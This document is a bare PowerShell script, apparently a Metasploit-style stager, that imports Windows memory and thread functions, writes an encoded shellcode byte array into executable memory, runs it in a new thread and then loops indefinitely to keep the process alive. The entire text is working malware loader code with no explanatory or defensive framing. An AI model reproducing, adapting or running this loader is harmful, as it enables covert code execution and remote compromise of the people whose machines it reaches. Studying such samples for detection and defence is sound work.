$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xfe,0x81,0xdb,0xd0,0xdd,0xc0,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x31,0x56,0x13,0x83,0xee,0xfc,0x03,0x56,0xf1,0x63,0x2e,0x2c,0xe5,0xe6,0xd1,0xcd,0xf5,0x86,0x58,0x28,0xc4,0x86,0x3f,0x38,0x76,0x37,0x4b,0x6c,0x7a,0xbc,0x19,0x85,0x09,0xb0,0xb5,0xaa,0xba,0x7f,0xe0,0x85,0x3b,0xd3,0xd0,0x84,0xbf,0x2e,0x05,0x67,0xfe,0xe0,0x58,0x66,0xc7,0x1d,0x90,0x3a,0x90,0x6a,0x07,0xab,0x95,0x27,0x94,0x40,0xe5,0xa6,0x9c,0xb5,0xbd,0xc9,0x8d,0x6b,0xb6,0x93,0x0d,0x8d,0x1b,0xa8,0x07,0x95,0x78,0x95,0xde,0x2e,0x4a,0x61,0xe1,0xe6,0x83,0x8a,0x4e,0xc7,0x2c,0x79,0x8e,0x0f,0x8a,0x62,0xe5,0x79,0xe9,0x1f,0xfe,0xbd,0x90,0xfb,0x8b,0x25,0x32,0x8f,0x2c,0x82,0xc3,0x5c,0xaa,0x41,0xcf,0x29,0xb8,0x0e,0xd3,0xac,0x6d,0x25,0xef,0x25,0x90,0xea,0x66,0x7d,0xb7,0x2e,0x23,0x25,0xd6,0x77,0x89,0x88,0xe7,0x68,0x72,0x74,0x42,0xe2,0x9e,0x61,0xff,0xa9,0xf6,0x46,0x32,0x52,0x06,0xc1,0x45,0x21,0x34,0x4e,0xfe,0xad,0x74,0x07,0xd8,0x2a,0x7b,0x32,0x9c,0xa5,0x82,0xbd,0xdd,0xec,0x40,0xe9,0x8d,0x86,0x61,0x92,0x45,0x57,0x8e,0x47,0xc9,0x07,0x20,0x38,0xaa,0xf7,0x80,0xe8,0x42,0x12,0x0f,0xd6,0x73,0x1d,0xda,0x7f,0x19,0xe7,0x8c,0xbf,0x76,0xe6,0x22,0x28,0x85,0xe9,0xbb,0x13,0x00,0x0f,0xd1,0x73,0x45,0x87,0x4d,0xed,0xcc,0x53,0xec,0xf2,0xda,0x19,0x2e,0x78,0xe9,0xde,0xe0,0x89,0x84,0xcc,0x94,0x79,0xd3,0xaf,0x32,0x85,0xc9,0xda,0xba,0x13,0xf6,0x4c,0xed,0x8b,0xf4,0xa9,0xd9,0x13,0x06,0x9c,0x52,0x9d,0x92,0x5f,0x0c,0xe2,0x72,0x60,0xcc,0xb4,0x18,0x60,0xa4,0x60,0x79,0x33,0xd1,0x6e,0x54,0x27,0x4a,0xfb,0x57,0x1e,0x3f,0xac,0x3f,0x9c,0x66,0x9a,0x9f,0x5f,0x4d,0x1a,0xe3,0x89,0xab,0x68,0x0d,0x0a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
